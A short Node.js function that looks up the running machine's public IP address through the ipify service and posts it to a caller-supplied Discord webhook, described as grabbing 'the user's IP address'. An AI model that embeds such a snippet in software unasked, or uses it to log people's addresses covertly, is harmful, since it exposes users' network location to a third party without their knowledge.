	const axios = require('axios');
 
/**
 * Function to grab the user's IP address and send it to a Discord webhook.
 *
 * @param {string} webhookUrl - The URL of the Discord webhook.
 * @returns {Promise} A promise that resolves when the IP address is sent successfully, or rejects with an error.
 */
async function sendIPToDiscord(webhookUrl) {
    try {
        // Make a request to an IP lookup service to get the user's IP address
        const response = await axios.get('https://api.ipify.org?format=json');
        const ipAddress = response.data.ip;
 
        // Send the IP address to the Discord webhook
        await axios.post(webhookUrl, {
            content: `IP Address: ${ipAddress}`
        });
 
        console.log('IP address sent to Discord successfully.');
    } catch (error) {
        console.error('Error sending IP address to Discord:', error.message);
        throw error;
    }
}
